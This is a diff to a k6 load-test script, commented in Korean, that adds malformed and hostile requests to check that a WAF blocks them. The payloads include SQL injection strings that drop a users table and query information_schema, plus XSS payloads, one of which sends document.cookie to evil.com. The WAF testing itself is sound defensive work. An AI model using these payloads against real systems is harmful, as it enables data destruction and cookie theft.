@@ -1,68 +1,81 @@
 /**
- * k6 Load Test Script — 패턴 선택 가능
+ * k6 Load Test Script — 패턴 선택 + 비정상 트래픽 혼합
  *
  * PATTERN 환경변수로 트래픽 패턴 선택:
+ *   rampup (기본) : 점진 증가 → 유지 → 감소
+ *   step          : 계단식 증가
+ *   spike         : 기준 트래픽 → 급등 → 복귀
  *
- *   rampup (기본)
- *     0 → RATE 점진 증가 → 유지 → 감소
- *     변수: RATE, RAMPUP(2m), SUSTAIN(3m), RAMPDOWN(1m)
+ * 비정상 트래픽:
+ *   ABNORMAL_RATE : 전체 요청 중 비정상 요청 비율 (0~100, 기본 0)
  *
- *   step
- *     RATE를 STEPS 단계로 나눠 계단식 증가
- *     변수: RATE, STEPS(4), STEP_DURATION(1m), SUSTAIN(2m)
- *
- *   spike
- *     낮은 기준 트래픽 → 갑작스러운 급등 → 기준 복귀
- *     변수: RATE, BASELINE(5), WARMUP(1m), SPIKE_DURATION(30s), COOLDOWN(1m)
+ *   비정상 유형 (랜덤 선택):
+ *     1. 빈 바디                 → 403 기대
+ *     2. 필수 필드 누락           → 403 기대
+ *     3. 잘못된 JSON             → 403 기대
+ *     4. SQL 인젝션 패턴         → 403 기대
+ *     5. XSS 패턴               → 403 기대
+ *     6. 초대용량 페이로드        → 403 기대
+ *     7. 잘못된 Content-Type     → 403 기대
+ *     8. 존재하지 않는 경로       → 404 기대
  *
  * 공통 변수:
- *   URL  - 대상 URL (default: http://localhost:8080/v1/stress)
- *   RATE - 피크 req/s (default: 56)
+ *   URL           - 대상 URL (default: http://localhost:8080/v1/stress)
+ *   RATE          - 피크 req/s (default: 56)
+ *   ABNORMAL_RATE - 비정상 요청 비율 % (default: 0)
  */
 
 import http from 'k6/http';
 import { check } from 'k6';
 import { Trend, Rate, Counter } from 'k6/metrics';
 
-const customLatency = new Trend('stress_latency_ms', true);
-const customSuccess = new Rate('stress_success_rate');
-const customTotal   = new Counter('stress_total_requests');
+// ── 메트릭 정의 ───────────────────────────────────────────────
+const customLatency  = new Trend('stress_latency_ms', true);
+const customSuccess  = new Rate('stress_success_rate');
+const customTotal    = new Counter('stress_total_requests');
+const abnormalTotal  = new Counter('stress_abnormal_requests');  // 비정상 요청 수
+const wafBlockRate   = new Rate('stress_waf_block_rate');        // WAF 차단 성공률
 
 // ── 공통 변수 ─────────────────────────────────────────────────
-const TARGET_URL = __ENV.URL     || 'http://localhost:8080/v1/stress';
-const RATE       = parseInt(__ENV.RATE || '56');
-const PATTERN    = (__ENV.PATTERN || 'rampup').toLowerCase();
+const TARGET_URL    = __ENV.URL          || 'http://localhost:8080/v1/stress';
+const RATE          = parseInt(__ENV.RATE          || '56');
+const PATTERN       = (__ENV.PATTERN     || 'rampup').toLowerCase();
+const ABNORMAL_RATE = parseInt(__ENV.ABNORMAL_RATE || '0');  // 0~100 %
+
+// 존재하지 않는 경로 (404 테스트용)
+const BASE_URL      = TARGET_URL.replace(/\/v\d+\/.*$/, '');
+const INVALID_PATHS = ['/v1/none', '/v1/admin', '/v1/config', '/v1/unknown', '/v1/test'];
 
 // ── 패턴별 stage 계산 ─────────────────────────────────────────
 function buildStages() {
   if (PATTERN === 'step') {
-    const steps        = parseInt(__ENV.STEPS         || '4');
-    const stepDuration = __ENV.STEP_DURATION          || '1m';
-    const sustain      = __ENV.SUSTAIN                || '2m';
+    const steps        = parseInt(__ENV.STEPS        || '4');
+    const stepDuration = __ENV.STEP_DURATION         || '1m';
+    const sustain      = __ENV.SUSTAIN               || '2m';
 
     const stages = [];
     for (let i = 1; i <= steps; i++) {
       const stepRate = Math.round(RATE * i / steps);
-      stages.push({ duration: '1s',         target: stepRate });  // 즉시 점프
-      stages.push({ duration: stepDuration, target: stepRate });  // 해당 레벨 유지
+      stages.push({ duration: '1s',         target: stepRate });
+      stages.push({ duration: stepDuration, target: stepRate });
     }
-    stages.push({ duration: '1s',     target: RATE }); // 피크 즉시 점프
-    stages.push({ duration: sustain,  target: RATE }); // 피크 유지
+    stages.push({ duration: '1s',    target: RATE });
+    stages.push({ duration: sustain, target: RATE });
     return stages;
   }
 
   if (PATTERN === 'spike') {
-    const baseline      = parseInt(__ENV.BASELINE       || '5');
-    const warmup        = __ENV.WARMUP                  || '30s';  // 짧은 준비 구간
-    const spikeDuration = __ENV.SPIKE_DURATION          || '3m';   // 충분한 피크 구간
-    const cooldown      = __ENV.COOLDOWN                || '30s';  // 짧은 복귀 구간
+    const baseline      = parseInt(__ENV.BASELINE      || '5');
+    const warmup        = __ENV.WARMUP                 || '30s';
+    const spikeDuration = __ENV.SPIKE_DURATION         || '3m';
+    const cooldown      = __ENV.COOLDOWN               || '30s';
 
     return [
-      { duration: warmup,        target: baseline },  // 기준 트래픽 준비
-      { duration: '5s',          target: RATE     },  // 급등 (5초, 빠르게)
-      { duration: spikeDuration, target: RATE     },  // 스파이크 유지
-      { duration: '5s',          target: baseline },  // 급감 (5초, 빠르게)
-      { duration: cooldown,      target: baseline },  // 기준 복귀
+      { duration: warmup,        target: baseline },
+      { duration: '5s',          target: RATE     },
+      { duration: spikeDuration, target: RATE     },
+      { duration: '5s',          target: baseline },
+      { duration: cooldown,      target: baseline },
     ];
   }
 
@@ -72,9 +85,9 @@ function buildStages() {
   const rampdown = __ENV.RAMPDOWN || '1m';
 
   return [
-    { duration: rampup,   target: RATE },  // 점진 증가
-    { duration: sustain,  target: RATE },  // 피크 유지
-    { duration: rampdown, target: 0    },  // 점진 감소
+    { duration: rampup,   target: RATE },
+    { duration: sustain,  target: RATE },
+    { duration: rampdown, target: 0    },
   ];
 }
 
@@ -110,49 +123,150 @@ function generateRequestId() {
   return String(Math.floor(Math.random() * 1_000_000_000_000)).padStart(12, '0');
 }
 
-// ── 메인 VU 함수 ──────────────────────────────────────────────
-export default function () {
+// ── 비정상 요청 전송 ──────────────────────────────────────────
+function sendAbnormalRequest() {
+  const typeIdx = Math.floor(Math.random() * 8);
+
+  let url           = TARGET_URL;
+  let payload       = '';
+  let expectedStatus = 403;
+  const headers     = {
+    'Content-Type': 'application/json',
+    'User-Agent':   'k6-load-test/1.0',
+  };
+
+  switch (typeIdx) {
+    case 0:
+      // 빈 바디
+      payload = '';
+      break;
+
+    case 1:
+      // 필수 필드 누락 (requestid, uuid 없음)
+      payload = JSON.stringify({ length: 256 });
+      break;
+
+    case 2:
+      // 잘못된 JSON 형식
+      payload = '{bad:json,missing:quotes}';
+      break;
+
+    case 3:
+      // SQL 인젝션 패턴
+      payload = JSON.stringify({
+        requestid: "' OR '1'='1'; DROP TABLE users--",
+        uuid:      "' UNION SELECT * FROM information_schema.tables--",
+        length:    256,
+      });
+      break;
+
+    case 4:
+      // XSS 패턴
+      payload = JSON.stringify({
+        requestid: '<script>alert(document.cookie)</script>',
+        uuid:      '<img src=x onerror=fetch("http://evil.com?c="+document.cookie)>',
+        length:    256,
+      });
+      break;
+
+    case 5:
+      // 초대용량 페이로드 (10KB)
+      payload = JSON.stringify({
+        requestid: generateRequestId(),
+        uuid:      generateUUID(),
+        length:    256,
+        padding:   'X'.repeat(10240),
+      });
+      break;
+
+    case 6:
+      // 잘못된 Content-Type
+      headers['Content-Type'] = 'text/plain';
+      payload = `requestid=${generateRequestId()}&uuid=${generateUUID()}`;
+      break;
+
+    case 7:
+      // 존재하지 않는 경로 → 404 기대
+      url = BASE_URL + INVALID_PATHS[Math.floor(Math.random() * INVALID_PATHS.length)];
+      payload = JSON.stringify({
+        requestid: generateRequestId(),
+        uuid:      generateUUID(),
+        length:    256,
+      });
+      expectedStatus = 404;
+      break;
+  }
+
+  const res = http.post(url, payload, {
+    headers,
+    tags: { request_type: 'abnormal' },
+  });
+
+  const blocked = res.status === expectedStatus;
+
+  check(res, {
+    [`비정상 차단 (${expectedStatus})`]: (r) => r.status === expectedStatus,
+  });
+
+  abnormalTotal.add(1);
+  wafBlockRate.add(blocked);
+}
+
+// ── 정상 요청 전송 ────────────────────────────────────────────
+function sendNormalRequest() {
   const payload = JSON.stringify({
     requestid: generateRequestId(),
     uuid:      generateUUID(),
     length:    256,
   });
 
-  const params = {
+  const res = http.post(TARGET_URL, payload, {
     headers: {
       'Content-Type': 'application/json',
       'User-Agent':   'k6-load-test/1.0',
     },
-    tags: { endpoint: 'stress' },
-  };
+    tags: { request_type: 'normal' },
+  });
 
-  const res = http.post(TARGET_URL, payload, params);
-
-  // check()는 Grafana/콘솔 표시용 — 두 조건을 별도로 확인
   check(res, {
     'HTTP 200':        (r) => r.status === 200,
     'latency < 500ms': (r) => r.timings.duration < 500,
   });
 
-  // 성공률은 HTTP 상태코드만으로 판단
-  // (latency는 http_req_duration threshold에서 별도 관리)
   const httpOk = res.status >= 200 && res.status < 300;
-
   customLatency.add(res.timings.duration);
   customSuccess.add(httpOk);
   customTotal.add(1);
 }
 
+// ── 메인 VU 함수 ──────────────────────────────────────────────
+export default function () {
+  if (ABNORMAL_RATE > 0 && Math.random() * 100 < ABNORMAL_RATE) {
+    sendAbnormalRequest();
+  } else {
+    sendNormalRequest();
+  }
+}
+
 // ── 요약 출력 ─────────────────────────────────────────────────
 export function handleSummary(data) {
-  const dur   = data.metrics.http_req_duration;
-  const reqs  = data.metrics.http_reqs;
-  const fails = data.metrics.http_req_failed;
+  const dur      = data.metrics.http_req_duration;
+  const reqs     = data.metrics.http_reqs;
+  const fails    = data.metrics.http_req_failed;
+  const abnormal = data.metrics.stress_abnormal_requests;
+  const waf      = data.metrics.stress_waf_block_rate;
 
-  const rps      = reqs  ? reqs.values.rate.toFixed(2)         : 'N/A';
-  const p90      = dur   ? dur.values['p(90)'].toFixed(2)       : 'N/A';
-  const p99      = dur   ? dur.values['p(99)'].toFixed(2)       : 'N/A';
-  const failRate = fails ? (fails.values.rate * 100).toFixed(2) : 'N/A';
+  const rps           = reqs     ? reqs.values.rate.toFixed(2)           : 'N/A';
+  const p90           = dur      ? dur.values['p(90)'].toFixed(2)         : 'N/A';
+  const p99           = dur      ? dur.values['p(99)'].toFixed(2)         : 'N/A';
+  const failRate      = fails    ? (fails.values.rate * 100).toFixed(2)   : 'N/A';
+  const abnormalCount = abnormal ? abnormal.values.count                  : 0;
+  const wafRate       = waf      ? (waf.values.rate * 100).toFixed(2)     : 'N/A';
+
+  const abnormalSection = ABNORMAL_RATE > 0 ? `
+  ── 비정상 트래픽 ─────────────────────────────
+  비정상 요청 수  : ${abnormalCount} 건
+  WAF 차단 성공률 : ${wafRate} %` : '';
 
   console.log(`
 ══════════════════════════════════════════════
@@ -161,7 +275,7 @@ export function handleSummary(data) {
   RPS (평균)  : ${rps} req/s
   P90 latency : ${p90} ms
   P99 latency : ${p99} ms
-  Error rate  : ${failRate} %
+  Error rate  : ${failRate} %${abnormalSection}
 ══════════════════════════════════════════════`);
 
   return {};
